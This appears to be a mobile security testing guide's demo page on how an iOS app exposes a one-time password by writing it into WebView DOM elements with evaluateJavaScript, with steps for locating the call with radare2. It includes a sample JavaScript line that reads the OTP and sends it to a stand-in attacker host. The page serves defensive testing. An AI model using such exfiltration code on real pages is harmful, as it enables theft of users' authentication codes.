---
platform: ios
title: Sensitive Data Written into WebView DOM via evaluateJavaScript
code: [swift]
id: MASTG-DEMO-0x05
test: MASTG-TEST-0x05
kind: fail
---

## Sample

This sample loads a `WKWebView` page with placeholder `<div>` elements and then injects a one-time-password directly into those elements using `evaluateJavaScript` with `textContent` assignments. Because the data is written into the DOM, any JavaScript running on the page can read it at any time:

```javascript
// Attacker reads the injected OTP from the DOM
const otp = document.getElementById('otp-display').textContent;
fetch("https://attacker.example.com/?otp=" + otp);
```

{{ MastgTest.swift }}

## Steps

1. Use @MASTG-TECH-0058 to extract the app. The main binary is `./Payload/MASTestApp.app/MASTestApp`.
2. Use @MASTG-TOOL-0073 with the `-i` option to run this script.

{{ webview_sensitive_data_exposure.r2 }}

{{ run.sh }}

## Observation

The script identifies the call site where `evaluateJavaScript:completionHandler:` is used. In the disassembly we can see the construction of the JavaScript string that writes sensitive OTP token into the DOM.

{{ output.txt }}

## Evaluation

The test case fails because the app writes sensitive data into DOM elements using `evaluateJavaScript:completionHandler:`.

1. Address `0x100004988`: calls `evaluateJavaScript` with a script that injects the one-time-password stored in `MastgTest.secretOtp` into `#otp-display` via `textContent`.

The value is written into the DOM and can be read by any script running on the page. In a real app, this value would come from native data sources (for example, an authentication server or a backend API) and would be interpolated into the JavaScript string before evaluation, making it equally readable by page JavaScript once injected.
